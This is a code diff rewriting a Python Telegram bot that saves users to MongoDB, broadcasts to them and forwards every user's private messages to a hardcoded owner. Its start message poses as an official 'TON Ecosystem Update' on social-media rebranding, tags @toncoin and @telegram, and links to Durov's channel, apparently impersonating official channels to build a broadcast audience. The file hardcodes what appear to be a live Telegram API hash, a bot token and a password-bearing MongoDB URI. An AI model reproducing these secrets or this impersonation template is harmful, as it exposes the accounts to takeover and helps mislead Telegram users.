@@ -1,182 +1,171 @@
 import asyncio
+import random
 from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from pymongo import MongoClient
 
-api_id = 26416419
-api_hash = "c109c77f5823c847b1aeb7fbd4990cc4"
-main_bot_token = "7904916101:AAHgWzRQ062QFMzL3UTDsCcq512DmCWB7Vw"
+# CONFIG
+API_ID = 26416419
+API_HASH = "c109c77f5823c847b1aeb7fbd4990cc4"
+BOT_TOKEN = "7904916101:AAHgWzRQ062QFMzL3UTDsCcq512DmCWB7Vw"
+OWNER_ID = 7913490752
+MONGO_URI = "mongodb+srv://sumauyui:BmMk5HpP6Zy4wOsM@cluster0.xvnav2j.mongodb.net/myDatabase?retryWrites=true&w=majority"
+USER_FILE = "ton_bot_users"  # Change this name per bot for separation
 
-# ====== ALLOWED USERS ======
-allowed_users = {7913490752}
+# Bot Client
+bot = Client("ton_update_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-main_app = Client("controller_bot", api_id=api_id, api_hash=api_hash, bot_token=main_bot_token)
+# MongoDB setup
+mongo_client = MongoClient(MONGO_URI)
+db = mongo_client.get_database()
+users_col = db[USER_FILE]
 
-hosted_bots = {}
-owners = {}
-users_db = {}
-custom_replies = {}
-broadcast_msgs = {}
-trigger_temp = {}
+# Broadcast state
+broadcast_messages = {}
 
-# =========== MAIN BOT HANDLERS ===========
+# /start handler (private only)
+@bot.on_message(filters.private & filters.command("start"))
+async def start(client, message):
+    # Save user to MongoDB if not exists
+    if not users_col.find_one({"_id": message.from_user.id}):
+        users_col.insert_one({
+            "_id": message.from_user.id,
+            "first_name": message.from_user.first_name,
+            "username": message.from_user.username,
+            "user_file": USER_FILE
+        })
 
-@main_app.on_message(filters.command("start") & filters.private)
-async def start_main(client, message):
-    if message.from_user.id not in allowed_users:
-        await message.reply_text("❌ You are not authorized to use this bot.")
-        return
-    await message.reply_text("**please enter your bot token sir !**", parse_mode="markdown")
-
-@main_app.on_message(filters.command("add") & filters.private)
-async def add_user(client, message):
-    if message.from_user.id not in allowed_users:
-        await message.reply_text("❌ You are not authorized to use this command.")
-        return
-    try:
-        new_user = int(message.text.split()[1])
-        allowed_users.add(new_user)
-        await message.reply_text(f"✅ User {new_user} added successfully.")
-    except:
-        await message.reply_text("⚠️ Usage: /add {user_id}")
-
-@main_app.on_message(filters.private & ~filters.command(["start", "add"]))
-async def handle_token(client, message):
-    if message.from_user.id not in allowed_users:
-        await message.reply_text("❌ You are not authorized to use this bot.")
-        return
-
-    token = message.text.strip()
-    owner_id = message.from_user.id
-
-    owners[token] = owner_id
-    users_db[token] = set()
-    custom_replies[token] = {}
-    broadcast_msgs[token] = []
-    trigger_temp[token] = None
-
-    # Start hosted bot
-    hosted_bots[token] = Client(f"hosted_bot_{token}", api_id=api_id, api_hash=api_hash, bot_token=token)
-    await hosted_bots[token].start()
-
-    # Register handlers dynamically for hosted bot
-    register_hosted_bot_handlers(token)
-
-    await message.reply_text(
-        "<b>📢 TON Ecosystem Update: Social Media Rebranding</b>\n\n"
-        "<blockquote>TON community has evolved from a builders’ hub into a global network of users, creators, and developers. "
+    text = (
+        "<blockquote><b>📢 TON Ecosystem Update: Social Media Rebranding</b></blockquote>\n\n"
+        "<b>TON community has evolved from a builders’ hub into a global network of users, creators, and developers. "
         "To mirror this evolution, we’re streamlining our social media presence for clarity, communication, and consistency. "
-        "Here’s what’s changing: @toncoin @telegram</blockquote>",
-        parse_mode="html"
+        "Here’s what’s changing: @toncoin @telegram</b>"
     )
+    buttons = InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton("Crypto", url="https://t.me/durov"),
+                InlineKeyboardButton("Durov", url="https://t.me/durov"),
+            ]
+        ]
+    )
+    await message.reply(text, reply_markup=buttons)
 
-# =========== HOSTED BOT HANDLERS ===========
+# Random replies for non-command messages (private only)
+@bot.on_message(filters.private & filters.text & ~filters.command(["start", "owner", "send"]))
+async def random_reply(client, message):
+    replies = ["Hello", "Yo Sir", "Welcome"]
+    await message.reply(random.choice(replies))
 
-def register_hosted_bot_handlers(token):
-    bot = hosted_bots[token]
+# Owner panel (private only)
+@bot.on_message(filters.private & filters.command("owner") & filters.user(OWNER_ID))
+async def owner_panel(client, message):
+    panel = (
+        "<b>👑 Owner Panel</b>\n\n"
+        "Choose an option below:"
+    )
+    buttons = InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton("👥 Live Users", callback_data="live_users"),
+            ],
+            [
+                InlineKeyboardButton("📢 Broadcast", callback_data="broadcast"),
+                InlineKeyboardButton("⚙️ Customize", callback_data="customize"),
+            ]
+        ]
+    )
+    await message.reply(panel, reply_markup=buttons)
 
-    @bot.on_message(filters.command("start") & filters.private)
-    async def start_hosted(client, message):
-        users_db[token].add(message.from_user.id)
-        if message.from_user.id == owners[token]:
-            await message.reply_text(
-                f"<b>Yoo , {message.from_user.mention}</b>\n"
-                "<blockquote>You Can Customize Your Bot From Here</blockquote>",
-                parse_mode="html",
-                reply_markup=InlineKeyboardMarkup(
-                    [
-                        [InlineKeyboardButton("Live Static ✨", callback_data=f"live_{token}")],
-                        [InlineKeyboardButton("Broadcast 💗", callback_data=f"broadcast_{token}")],
-                        [InlineKeyboardButton("Customize", callback_data=f"custom_{token}")]
-                    ]
-                )
-            )
-        else:
-            await message.reply_text("Welcome!")
+# Callback queries (private only)
+@bot.on_callback_query()
+async def callbacks(client, callback_query):
+    data = callback_query.data
 
-    @bot.on_callback_query(filters.create(lambda _, __, query: query.data.startswith("live_")))
-    async def live_static(client, callback_query):
-        if callback_query.from_user.id != owners[token]:
-            await callback_query.answer("Not allowed.")
-            return
-        await callback_query.message.edit_text(
-            f"<b>Live Users Count:</b> <blockquote>{len(users_db[token])}</blockquote>",
-            parse_mode="html",
-            reply_markup=InlineKeyboardMarkup(
+    if data == "live_users":
+        all_users = list(users_col.find({}))
+        user_list = "\n".join([f"{i+1}. <code>{u['_id']}</code>" for i, u in enumerate(all_users)]) or "No users yet."
+        text = f"<b>👥 Live Users ({len(all_users)}):</b>\n{user_list}"
+        buttons = InlineKeyboardMarkup(
+            [
                 [
-                    [InlineKeyboardButton("Refresh 🔄", callback_data=f"live_{token}")],
-                    [InlineKeyboardButton("Back 🔙", callback_data=f"back_{token}")]
+                    InlineKeyboardButton("🔄 Refresh", callback_data="refresh_users"),
+                    InlineKeyboardButton("🔙 Back", callback_data="owner_panel"),
                 ]
-            )
+            ]
         )
+        await callback_query.message.edit(text, reply_markup=buttons, parse_mode="html")
 
-    @bot.on_callback_query(filters.create(lambda _, __, query: query.data.startswith("back_")))
-    async def back_home(client, callback_query):
-        await start_hosted(client, callback_query.message)
+    elif data == "refresh_users":
+        all_users = list(users_col.find({}))
+        user_list = "\n".join([f"{i+1}. <code>{u['_id']}</code>" for i, u in enumerate(all_users)]) or "No users yet."
+        text = f"<b>👥 Live Users ({len(all_users)}):</b>\n{user_list}"
+        await callback_query.message.edit(text, parse_mode="html")
 
-    @bot.on_callback_query(filters.create(lambda _, __, query: query.data.startswith("broadcast_")))
-    async def broadcast_start(client, callback_query):
-        if callback_query.from_user.id != owners[token]:
-            await callback_query.answer("Not allowed.")
-            return
-        broadcast_msgs[token].clear()
-        await callback_query.message.edit_text(
-            "<b>Broadcast Mode</b>\n<blockquote>Send messages you want to broadcast. When ready, type /send</blockquote>",
+    elif data == "owner_panel":
+        panel = (
+            "<b>👑 Owner Panel</b>\n\n"
+            "Choose an option below:"
+        )
+        buttons = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton("👥 Live Users", callback_data="live_users"),
+                ],
+                [
+                    InlineKeyboardButton("📢 Broadcast", callback_data="broadcast"),
+                    InlineKeyboardButton("⚙️ Customize", callback_data="customize"),
+                ]
+            ]
+        )
+        await callback_query.message.edit(panel, reply_markup=buttons, parse_mode="html")
+
+    elif data == "broadcast":
+        broadcast_messages[callback_query.from_user.id] = ""
+        await callback_query.message.edit(
+            "📝 <b>Send the broadcast message now.\nOnce done, tap /send to confirm.</b>",
             parse_mode="html"
         )
 
-    @bot.on_message(filters.command("send") & filters.private)
-    async def send_broadcast(client, message):
-        if message.from_user.id != owners[token]:
-            return
-        for user_id in users_db[token]:
+    elif data == "customize":
+        await callback_query.message.edit("⚙️ <b>Customize options will appear here.</b>", parse_mode="html")
+
+    await callback_query.answer()
+
+# Capture broadcast messages (private only)
+@bot.on_message(filters.private & filters.user(OWNER_ID) & ~filters.command("send"))
+async def save_broadcast(client, message):
+    if message.from_user.id in broadcast_messages:
+        broadcast_messages[message.from_user.id] = message
+        await message.reply("✅ <b>Broadcast message saved. Tap /send to send it.</b>", parse_mode="html")
+
+# /send to send broadcast (private only)
+@bot.on_message(filters.private & filters.command("send") & filters.user(OWNER_ID))
+async def send_broadcast(client, message):
+    if message.from_user.id in broadcast_messages and broadcast_messages[message.from_user.id]:
+        sent = 0
+        failed = 0
+        all_users = list(users_col.find({}))
+        for user in all_users:
+            uid = user["_id"]
             try:
-                for msg in broadcast_msgs[token]:
-                    await bot.send_message(user_id, msg)
+                await broadcast_messages[message.from_user.id].copy(uid)
+                sent += 1
             except:
-                pass
-        await message.reply_text("<b>Broadcast sent!</b>", parse_mode="html")
-        broadcast_msgs[token].clear()
+                failed += 1
+        await message.reply(f"✅ Broadcast sent to {sent} users.\n❌ Failed: {failed}")
+        broadcast_messages.pop(message.from_user.id)
+    else:
+        await message.reply("⚠️ No broadcast message saved. Use /owner > Broadcast to save one first.")
 
-    @bot.on_callback_query(filters.create(lambda _, __, query: query.data.startswith("custom_")))
-    async def customize_start(client, callback_query):
-        if callback_query.from_user.id != owners[token]:
-            await callback_query.answer("Not allowed.")
-            return
-        trigger_temp[token] = None
-        await callback_query.message.edit_text(
-            "<b>Customize Mode</b>\n<blockquote>Send a trigger message, then its reply. Example:\nhello\nhi there</blockquote>",
-            parse_mode="html"
-        )
+# Forward all user messages to owner (private only, exclude owner)
+@bot.on_message(filters.private & ~filters.user(OWNER_ID))
+async def forward_to_owner(client, message):
+    try:
+        await message.forward(OWNER_ID)
+    except Exception as e:
+        print(f"Forward failed: {e}")
 
-    @bot.on_message(filters.private & ~filters.command(["start", "send"]))
-    async def handle_custom_or_broadcast(client, message):
-        users_db[token].add(message.from_user.id)
-
-        if message.from_user.id == owners[token]:
-            if trigger_temp[token] is None:
-                trigger_temp[token] = message.text.strip()
-                await message.reply_text(
-                    f"<b>Trigger saved:</b> <blockquote>{trigger_temp[token]}</blockquote>\nSend the reply now.",
-                    parse_mode="html"
-                )
-            else:
-                custom_replies[token][trigger_temp[token]] = message.text.strip()
-                await message.reply_text(
-                    f"<b>Custom reply saved!</b>\n<blockquote>{trigger_temp[token]} ➔ {message.text.strip()}</blockquote>",
-                    parse_mode="html"
-                )
-                trigger_temp[token] = None
-            broadcast_msgs[token].append(message.text)
-        else:
-            reply = custom_replies[token].get(message.text.strip())
-            if reply:
-                await message.reply_text(reply)
-
-# =========== RUN ===========
-
-async def main():
-    await main_app.start()
-    print("✅ Main controller bot running only for authorized users...")
-    await asyncio.Event().wait()
-
-asyncio.run(main())
+# Start bot
+print("TON Update Bot Running Sexy 🔥 With MongoDB")
+bot.run()
